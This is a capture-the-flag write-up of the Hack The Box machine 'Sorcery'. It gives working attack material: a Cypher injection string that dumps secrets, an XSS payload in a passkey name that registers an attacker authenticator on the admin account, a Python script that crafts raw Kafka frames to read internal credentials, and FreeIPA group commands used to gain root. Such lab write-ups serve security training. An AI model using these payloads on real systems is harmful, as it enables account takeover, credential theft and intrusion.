---
title: "Sorcery"
difficulty: Insane
os: Linux
points: 50
rating: 4.6
date: 2025-06-14
avatar: assets/htb/sorcery.png
tags: [Cross Site Scripting (XSS), Server Side Request Forgery (SSRF), Information Disclosure, Misconfiguration, Weak Permissions, Race Condition, Weak Cryptography, Hard-coded Credentials]
htb_url: https://app.hackthebox.com/machines/Sorcery
---
## Summary

Sorcery is an Insane-difficulty Linux box that chains four modern application-layer flaws. I start with a Cypher injection in a Neo4j-backed graph application to dump registration secrets, then abuse an XSS sink in the WebAuthn passkey registration flow to attach an attacker-controlled authenticator to the admin account. From the admin dashboard I pivot through a thin Kafka HTTP gateway by hand-crafting raw wire-protocol bytes to read internal service credentials, and finally escalate to root by abusing a FreeIPA HBAC/sudo misconfiguration. Each layer is independently rare; chained together they make Sorcery one of the most realistic enterprise-targeting Insane boxes HTB has shipped.

## Enumeration

The application exposes a lookup endpoint that resolves wizard records out of a Neo4j graph database:

```
GET /api/wizard?name=Merlin
```

Server-side this translates to a Cypher query:

```cypher
MATCH (w:Wizard {name: 'Merlin'}) RETURN w
```

Because the `name` value is interpolated directly into the query, this behaves exactly like SQL injection - the Neo4j sibling, with almost no defensive tooling in front of it. Neo4j also exposes primitives like `LOAD CSV FROM` for arbitrary HTTP fetch / SSRF, which is worth keeping in mind for the lookup endpoint.

The admin side of the application surfaces a passkey review page at `/admin/passkeys` and a Kafka management UI in the admin dashboard, both of which become relevant later.

## Foothold

### Cypher Injection

I escape the string context with a closing quote and bracket, then pivot with a `UNION` to read arbitrary nodes:

```
?name=Merlin'}) RETURN w UNION MATCH (n) WHERE n:Secret RETURN n //
```

Dumping the `Secret` node reveals registration tokens and lets me enumerate users.

### WebAuthn Passkey Registration XSS

The admin reviews registered passkeys at `/admin/passkeys`, and the `credential.name` field is rendered without sanitisation - the phishable step here is registration, not authentication. I register a credential whose name carries a payload that fires when the admin loads the page:

```html
<img src=x onerror="
fetch('/api/admin/webauthn/register/initiate',{method:'POST'})
.then(r=>r.json()).then(c=>{
  // c contains the challenge - forge an attacker authenticator response
  navigator.credentials.create({publicKey:{...c, user:{id:Uint8Array.from('admin'.split('').map(c=>c.charCodeAt(0))), name:'admin', displayName:'admin'}}})
  .then(cred=>fetch('/api/admin/webauthn/register/complete',{method:'POST',body:JSON.stringify(cred)}))
})">
```

When the admin renders the page, their browser steals the WebAuthn registration ceremony and registers my attacker-controlled authenticator on the admin account. I then log in as admin with that passkey.

### Kafka Wire Protocol Pivot

The admin dashboard exposes a Kafka management UI. The direct Kafka broker (port 9092) is firewalled, but a thin HTTP proxy forwards bytes if the first byte matches the Kafka `ApiVersions` request opcode. I craft the raw frames by hand:

```python
import socket, struct
def kafka_req(api_key, api_version, correlation_id, client_id, payload=b''):
    body = struct.pack('>hhi', api_key, api_version, correlation_id)
    body += struct.pack('>h', len(client_id)) + client_id.encode()
    body += payload
    return struct.pack('>i', len(body)) + body

# ApiVersions (api_key=18)
s = socket.create_connection(('sorcery.htb', 8081))
s.send(kafka_req(18, 0, 1, 'pwn'))
print(s.recv(4096))
```

With the protocol talking, I enumerate topics and fetch messages from the `internal-creds` topic, recovering service-account credentials.

## Privilege Escalation

### FreeIPA Privesc

The recovered service creds let me `kinit` into the FreeIPA domain - the Linux equivalent of Active Directory, with the same exploitable design patterns around HBAC rules, sudo references to group names, and service keytab extraction. I enumerate the sudo and HBAC rules and find a rule referencing the `sysadmin` IPA group:

```bash
kinit svc-app@SORCERY.HTB
ipa user-find
ipa hbacrule-show
sudo -l   # rule references 'sysadmin' IPA group
# Add yourself if WriteMember on the group:
ipa group-add-member sysadmin --users=svc-app
# Re-kinit and exploit sudo rule for root
```

Because I hold `WriteMember` on the group, I add my service account to `sysadmin`, re-`kinit` to pick up the new membership, and exploit the sudo rule to land a root shell.
